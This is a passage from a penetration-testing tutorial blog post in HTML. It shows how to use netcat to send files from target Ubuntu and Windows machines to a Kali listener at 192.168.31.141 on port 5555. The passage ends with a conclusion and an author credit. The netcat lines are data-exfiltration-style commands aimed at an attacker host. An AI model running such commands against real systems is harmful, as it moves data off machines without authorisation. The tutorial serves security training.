+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrEYjOpTYbrtwgv7KVe5eMJ4Qfk8ICdPJzQUlltKO2lkzgG2nAp4N1FZaioOdSCH3vkogEai1mKOhGqeAKN9D65RWIwLxRF27OLTZ2ZpFaE0fv3Vp3Jmh7dVCwE1_eZor0hrushOEBhxE5yYY1_8SDEuwTt_DYVGnSiUA3u6nScy3tK2N8p3DCeP4U8kPg/s16000/71.png"/></span></p>
+<p><span style="color: #000000;">Now we can run the following command in ubuntu to send the file to the kali machine:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+nc 192.168.31.141 5555 &lt; file.txt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8oS1X4RrOpN7Pvb3kWGBwwz-L0I0XAwFMttjuvTdeF8I-lQ5JrOq1Ub7jAVMFxPfkL8qfTSIZkcBIgOGpPF5b8Q_DYfq6mhzvixiGlUQosVu5FCL6vhG5YVwP3cION__k9kokA7rzKZ5iXuaOs5tbnkdl0r5_BaJrR2Ua71V4Q0jM_1aYxxtp2QXjx7NY/s16000/72.png" alt="File Transfer Windows and Linux" width="917" height="118"/></span></p>
+<p><span style="color: #000000;">Similarly, we can also receive files from a windows machine inside our kali linux. However, it should be noted that we the target windows machine should have the nc.exe binary to make this method work.</span></p>
+<p><span style="color: #000000;">Following is the command we need to run on the windows machine:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc.exe 192.168.31.141 5555 &lt; data.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgIjzVyTrgfr4esOxQDfaVhP7QtyuCcWj5tYPG3Bzj646H8As3qIf8g1AtjvSUiRE07UvoqM9ojR5OaojlFI_0q5rXncAIuegubNwzzLICrpZI__EMQC973mahtaL7V0PUJ_JUhVdXCP7j9rSWIslfBnnoAjS40GRc2dVxEkEIdngrx3o8ag2rnfG313o8e/s16000/73.png"/></span></p>
+<p><span style="color: #000000;">To receive the file in the kali machine, we will run the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 5555 &gt; data.txt
+cat data.txt</pre>
+<p><span style="color: #000000;"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6LU-K471evwFOeojlIiC0uJE84Wz0_3Z1oJcKP8h59pDfqQ2CEmpoj79KEs9G4Vxf-UhR4OR3SumX-nPUwbaBARiN6bLC520x8IOMnOuHFAbLe52HQTI0jFIkost4qII280ajayN66Dse9KTpjUTy_LzzhnYnvsMzxzFUuDokAG5O3bYQRegrQ2C_Uskw/s16000/74.png" alt="File Transfer Windows and Linux" width="858" height="330"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">As we have seen that there are various methods to transfer the file from out machine to target system and vice versa. It depends on one’s choice and circumstances to use the appropriate tool for the file transfer.</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultan-t. Contact</span> <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
